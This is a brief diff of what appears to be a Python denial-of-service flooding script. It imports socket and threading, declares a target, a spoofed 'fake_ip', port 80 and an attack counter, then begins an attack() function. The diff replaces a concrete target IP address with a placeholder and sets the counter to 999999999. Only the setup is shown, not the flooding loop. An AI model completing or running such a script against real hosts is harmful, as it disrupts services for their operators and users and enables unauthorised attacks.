@@ -1,11 +1,11 @@
 import socket
 import threading
 
-target = "104.21.16.1"
-fake_ip = "105.21.18.1"
+target = "TARGET IP"
+fake_ip = "RANDOM IP"
 port = 80
 
-attack_num = 0
+attack_num = 999999999
 
 def attack():
     global attack_num
